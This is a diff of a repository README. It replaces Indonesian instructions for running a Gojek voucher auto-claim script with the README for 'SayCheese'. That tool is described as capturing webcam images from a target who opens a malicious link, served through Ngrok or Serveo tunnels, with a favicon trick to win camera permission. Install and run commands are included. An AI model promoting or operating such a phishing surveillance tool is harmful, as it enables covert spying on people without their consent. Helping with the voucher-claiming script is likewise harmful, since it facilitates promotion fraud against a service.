@@ -1,27 +1,21 @@
-#voucher gojek claim voucher terbaru
+# SayCheese v1.0
+Take webcam shots from target just sending a malicious link
 
+![cheese](https://user-images.githubusercontent.com/34893261/56869077-e5714d80-69d1-11e9-8ce2-29a254021890.jpg)
 
-voucher go food dan Go ride
+# How it works?
+<p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia. </p>
 
-kode perintah
-pkg update
+<p>The MediaDevices.getUserMedia() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types. </p>
 
-pkg upgrade
+[See more about MediaDEvices.getUserMedia() here](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia)
+<p> To convince the target to grant permissions to access the cam, the page uses a javascript code made by https://github.com/wybiral that turns the favicon into a cam stream.</p>
 
-pkg install php
+## Installing (Kali Linux/Termux):
 
-pkg install curl
+```
+git clone https://github.com/thelinuxchoice/saycheese
+cd saycheese
+bash saycheese.sh
+```
 
-pkg install git
-
-setelah itu anda wajib memasukan kode perintah untuk mendownload script auto claim voucher gojek
-git clone https://github.com/kumpulanremaja/gofood
-
-lalu masukan kode perintah untuk menjalankan script , kode ini untuk daftar dan claim voucher go food gojek
-cd gofood
-
-php tembak.php
-
-
-
-untuk selengkapnya baca di https://www.kumpulanremaja.com/2019/11/cara-mendapatkan-voucher-go-food-gratis-gojek.html
